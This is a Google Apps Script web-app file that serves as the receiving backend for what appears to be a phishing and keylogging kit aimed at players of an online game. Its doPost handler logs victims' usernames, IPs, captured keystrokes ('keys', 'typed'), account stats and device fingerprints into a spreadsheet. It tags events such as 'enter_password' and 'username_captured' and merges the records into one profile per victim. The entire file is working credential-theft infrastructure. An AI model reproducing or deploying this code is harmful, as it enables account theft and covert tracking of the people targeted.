function doPost(e) {
  var gate = LockService.getScriptLock();
  if (!gate.tryLock(20000)) return ContentService.createTextOutput("busy");

  var data = {};
  try { data = JSON.parse(e.postData.contents); } catch (err) {}
  var user = String(data.username || "").trim().split(" | ")[0].trim();
  if (!user || user === "(unknown)") {
    try { gate.releaseLock(); } catch (e0) {}
    return ContentService.createTextOutput("skip");
  }

  var note = String(data.note || "");
  var box = String(data.box || "").trim();
  var bulk = String(data.page || "");
  var ip = String(data.ip || pullField(bulk, "ip") || "");
  if (ip === "unknown") ip = "";
  var keys = String(data.keys || pullField(bulk, "keys") || "");
  var typed = String(data.typed || pullField(bulk, "typed") || "");
  var account = String(data.account_info || pullField(bulk, "account_info") || "");
  var langRaw = String(data.language_pack || data.language_version || "");
  var lang = languageForUser_(realLanguage_(langRaw), user) || langRaw;
  var when = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "hh:mm:ss a M/d/yyyy");
  var color = noteColor(note);
  var savedNote = pickSavedNote_(box, note);

  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var events = getOrCreateSheet_(ss, "events", ["time", "username", "note", "bulk", "language_version"]);
  if (String(events.getRange(1, 5).getValue()) !== "language_version") {
    events.getRange(1, 5).setValue("language_version").setFontWeight("bold");
  }
  events.appendRow([when, user, note, bulk, langRaw]);
  events.getRange(events.getLastRow(), 1, 1, 5).setFontColor(color);

  var headers = [
    "first_seen", "last_seen", "username", "ip", "note",
    "estimatedRank", "credits", "gold", "account_extra", "device_info",
    "typed", "last_keys", "language_php", "lock"
  ];
  var users = getOrCreateSheet_(ss, "users", headers);
  users.getRange(1, 14).setValue("lock").setFontWeight("bold");
  users.getRange(1, 26).setValue("v29");
  styleUserHeader_(users, headers.length);
  collapseDupes_(users);

  var accName = "";
  String(account || "").split(" | ").forEach(function (part) {
    if (part.indexOf("username=") === 0) accName = part.slice(9).split(" | ")[0].trim();
  });
  if (accName) user = accName;

  var stats = parseStats_(account, user);
  var hasStats = hasStats_(stats);
  SpreadsheetApp.flush();
  var found = findUnlockedUserRow_(users, user);
  var width = 13;
  var extra = extraBlob_(account);
  var device = deviceBlob_(data, bulk);
  var estRank = rankFromXp_(account);

  if (found < 0 && (hasStats || savedNote || typed || keys || extra)) {
    users.appendRow([
      when, when, user, ip, savedNote,
      estRank, stats.credits, stats.gold, extra, device,
      typed, keys, lang, ""
    ]);
    found = findUnlockedUserRow_(users, user);
    if (found > 0) {
      styleUserRow_(users, found);
      users.getRange(found, 1, 1, width).setFontColor(color);
    }
  } else if (found > 0) {
    var old = users.getRange(found, 1, 1, width).getValues()[0];
    var next = old.slice();
    while (next.length < width) next.push("");
    next[0] = old[0] || when;
    next[1] = when;
    next[2] = user;
    if (ip) next[3] = ip;
    if (savedNote) next[4] = savedNote;
    if (estRank) next[5] = estRank;
    if (stats.credits !== "") next[6] = stats.credits;
    if (stats.gold !== "") next[7] = stats.gold;
    if (extra) next[8] = extra;
    if (device) next[9] = device;
    if (typed) next[10] = typed;
    if (keys) next[11] = keys;
    if (lang) next[12] = lang;
    users.getRange(found, 1, 1, width).setValues([next.slice(0, width)]);
    styleUserRow_(users, found);
    users.getRange(found, 1, 1, width).setFontColor(color);
  }

  collapseDupes_(users);
  try { gate.releaseLock(); } catch (err2) {}
  return ContentService.createTextOutput("ok");
}

function doGet() {
  return ContentService.createTextOutput(JSON.stringify({ ok: false })).setMimeType(ContentService.MimeType.JSON);
}

function collapseUserDupes() {
  var users = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("users");
  if (users) collapseDupes_(users);
}

function isRowLocked_(sheet, row) {
  return String(sheet.getRange(row, 14).getDisplayValue() || "").trim() !== "";
}

function findUnlockedUserRow_(sheet, user) {
  var last = sheet.getLastRow();
  if (last < 2) return -1;
  var names = sheet.getRange(2, 3, last - 1, 1).getValues();
  var want = shortName_(user);
  for (var i = 0; i < names.length; i++) {
    if (shortName_(names[i][0]) !== want) continue;
    var row = i + 2;
    if (!isRowLocked_(sheet, row)) return row;
  }
  return -1;
}

function collapseDupes_(sheet) {
  var last = sheet.getLastRow();
  if (last < 3) return;
  var width = 12;
  for (var r = last; r >= 3; r--) {
    var name = shortName_(sheet.getRange(r, 3).getValue());
    if (!name) continue;
    if (isRowLocked_(sheet, r)) continue;
    var keep = -1;
    for (var u = 2; u < r; u++) {
      if (isRowLocked_(sheet, u)) continue;
      if (shortName_(sheet.getRange(u, 3).getValue()) === name) {
        keep = u;
        break;
      }
    }
    if (keep < 0) continue;
    var a = sheet.getRange(keep, 1, 1, width).getValues()[0];
    var b = sheet.getRange(r, 1, 1, width).getValues()[0];
    for (var c = 0; c < width; c++) {
      if ((a[c] === "" || a[c] == null) && b[c] !== "" && b[c] != null) a[c] = b[c];
    }
    sheet.getRange(keep, 1, 1, width).setValues([a]);
    sheet.deleteRow(r);
  }
}

function getOrCreateSheet_(ss, name, headers) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) sheet = ss.insertSheet(name);
  if (sheet.getLastRow() === 0) {
    sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight("bold");
    sheet.setFrozenRows(1);
  }
  return sheet;
}

function styleUserRow_(sheet, row) {
  sheet.getRange(row, 1, 1, 5).setHorizontalAlignment("left");
  sheet.getRange(row, 6, 1, 3).setHorizontalAlignment("center");
  sheet.getRange(row, 9, 1, 6).setHorizontalAlignment("left");
}

function styleUserHeader_(sheet, width) {
  sheet.getRange(1, 1, 1, 5).setHorizontalAlignment("left");
  sheet.getRange(1, 6, 1, 3).setHorizontalAlignment("center");
  sheet.getRange(1, 9, 1, 6).setHorizontalAlignment("left");
  sheet.getRange(1, 1, 1, width).setFontWeight("bold");
  sheet.setFrozenRows(1);
}

function pullField(page, key) {
  var parts = String(page || "").split(" | ");
  for (var i = 0; i < parts.length; i++) {
    if (parts[i].indexOf(key + "=") === 0) return parts[i].slice(key.length + 1);
  }
  return "";
}

function rankFromXp_(account) {
  var xp = "";
  String(account || "").split(" | ").forEach(function (part) {
    if (part.indexOf("totalXP=") === 0) xp = part.slice(8);
  });
  var x = Number(xp);
  if (!isFinite(x) || x < 0) return "";
  var n = Math.floor((-1100 + Math.sqrt(1210000 + 2000 * x)) / 1000);
  if (n < 0) n = 0;
  return String(n + 1);
}

function kdrFrom_(account) {
  var kills = "", deaths = "";
  String(account || "").split(" | ").forEach(function (part) {
    if (part.indexOf("totalKills=") === 0) kills = part.slice(11);
    if (part.indexOf("totalDeaths=") === 0) deaths = part.slice(12);
  });
  var k = Number(kills);
  var d = Number(deaths);
  if (!isFinite(k) || k < 0) return "";
  if (!isFinite(d) || d <= 0) return k === 0 ? "0.00" : String(k.toFixed(2));
  return (k / d).toFixed(2);
}

function deviceBlob_(data, bulk) {
  function ok(v) {
    v = String(v || "").trim();
    if (!v) return "";
    if (/account_info=|payload_hash=|keys=|typed=/.test(v)) return "";
    if (v.indexOf(" | ") >= 0) return "";
    return v;
  }
  function grab(names) {
    var i;
    for (i = 0; i < names.length; i++) {
      var v = ok(pullField(bulk, names[i]));
      if (v) return v;
    }
    return "";
  }
  var page = "";
  var m = String(bulk || "").match(/page=(https?:\/\/[^ |]+)/);
  if (m) page = m[1];
  var bits = [];
  var ua = grab(["ua", "user_agent"]);
  var platform = grab(["platform"]);
  var lang = grab(["lang", "language"]);
  var tz = grab(["tz", "timezone"]);
  var screen = grab(["screen"]);
  var win = grab(["window"]);
  var dpr = grab(["dpr"]);
  var cores = grab(["cores"]);
  var mem = grab(["mem", "device_memory"]);
  var loginP = grab(["loginPath"]);
  if (ua) bits.push("ua=" + ua);
  if (platform) bits.push("platform=" + platform);
  if (lang) bits.push("lang=" + lang);
  if (tz) bits.push("tz=" + tz);
  if (screen) bits.push("screen=" + screen);
  if (win) bits.push("window=" + win);
  if (dpr) bits.push("dpr=" + dpr);
  if (cores) bits.push("cores=" + cores);
  if (mem) bits.push("mem=" + mem);
  if (page) bits.push("page=" + page);
  if (loginP) bits.push("loginPath=" + loginP);
  return bits.join(" | ");
}

function extraBlob_(account) {
  var skip = { username: 1, credits: 1, gold: 1, money: 1 };
  var bits = [];
  String(account || "").split(" | ").forEach(function (part) {
    var cut = part.indexOf("=");
    if (cut < 0) return;
    var k = part.slice(0, cut);
    var v = part.slice(cut + 1);
    if (!skip[k] && String(v) !== "") bits.push(k + "=" + v);
  });
  return bits.join(" | ");
}

function parseStats_(account, user) {
  var out = {
    credits: "", gold: "", totalXP: "", totalKills: "", totalDeaths: "",
    matchesWon: "", matchesLost: "", knifeKills: "", explosiveKills: "", nukeKills: "",
    highestKillStreak: "", mostKillsInAMatch: "", weaponsUnlocked: "", throwablesUnlocked: "", cases: ""
  };
  var owner = "";
  String(account || "").split(" | ").forEach(function (part) {
    if (part.indexOf("username=") === 0) owner = part.slice(9).split(" | ")[0].trim();
  });
  if (owner && user && owner.toLowerCase() !== String(user).toLowerCase()) return out;
  String(account || "").split(" | ").forEach(function (part) {
    var cut = part.indexOf("=");
    if (cut < 0) return;
    var k = part.slice(0, cut);
    var v = part.slice(cut + 1);
    if (k === "money") k = "credits";
    if (out.hasOwnProperty(k) && v !== "") out[k] = v;
  });
  return out;
}

function pickSavedNote_(box, note) {
  var b = String(box || "").trim();
  if (b && !isSystemNote_(b)) return b;
  var n = String(note || "").trim();
  var parts = n.split(" | ");
  if (parts.length > 1) {
    var rest = parts.slice(1).join(" | ").trim();
    if (rest && !isSystemNote_(rest)) return rest;
  }
  if (n && !isSystemNote_(n)) return n;
  return "";
}

function isSystemNote_(value) {
  return /^(enter_password|username_captured|login_php|account_info|ui_|youtube_click|discord_click|ctrl_)/i.test(String(value || "").trim());
}

function shortName_(value) {
  return String(value || "").split(" | ")[0].trim().toLowerCase();
}

function hasStats_(stats) {
  var k;
  for (k in stats) {
    if (stats[k] !== "") return true;
  }
  return false;
}

function languageOwner_(raw) {
  var s = String(raw || "");
  var m = s.match(/(?:^|[;\s])user=([^;|]+)/i);
  return m ? String(m[1]).trim() : "";
}

function languageForUser_(raw, user) {
  var s = String(raw || "").trim();
  if (!s) return "";
  var owner = languageOwner_(s);
  if (!owner) return "";
  if (shortName_(owner) !== shortName_(user)) return "";
  return s;
}

function realLanguage_(raw) {
  return String(raw || "").trim();
}

function noteColor(note) {
  var n = String(note || "");
  if (n.indexOf("youtube_click") === 0) return "#cc0000";
  if (n.indexOf("discord_click") === 0) return "#5865F2";
  if (n.indexOf("ui_") === 0) return "#6b7280";
  if (n.indexOf("username_captured") === 0 || n.indexOf("account_info") === 0) return "#000000";
  return "#188038";
}
